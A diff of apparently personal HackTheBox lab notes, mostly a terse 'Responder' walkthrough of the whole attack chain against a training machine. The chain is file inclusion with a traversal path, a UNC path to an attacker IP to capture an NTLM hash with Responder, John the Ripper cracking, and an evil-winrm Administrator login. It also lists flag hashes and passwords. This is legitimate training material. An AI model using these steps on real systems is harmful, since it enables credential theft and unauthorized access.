@@ -91,7 +91,7 @@ MariaDB
 -u
 root
 mysql -u root -h 10.129.85.234
-* 
+*
 ;
 show databases;
 htb
@@ -130,3 +130,31 @@ admin
 rKXM59ESxesUFHAd
 
 c7110277ac44d78b6a9fff2232434d16
+
+# Responder
+HackTheBox Responder Walkthrough
+10.129.162.46
+curl http://10.129.162.46
+unika.htb
+
+sudo nano /etc/hosts
+nmap -F -sV -sC 10.129.162.46
+php
+page
+../../../../../../../../windows/system32/drivers/etc/hosts
+//10.10.14.6/somefile
+NTLM stands for New Technology LAN Manager
+responder -I tun0
+ip a | grep tun0
+unika.htb/index.php/page=//10.10.16.75/SharedFileHTB
+John The Ripper
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+badminton
+nmap -Pn -sV -sC -T4 -p 5985-5985 10.129.162.46
+evil-winrm -i 10.129.162.46 -u Administrator -p badminton
+5985
+cd C:\Users\mike\Desktop
+type flag.txt
+ea81b7afddd03efaa0945333ed147fac
+
+# Three
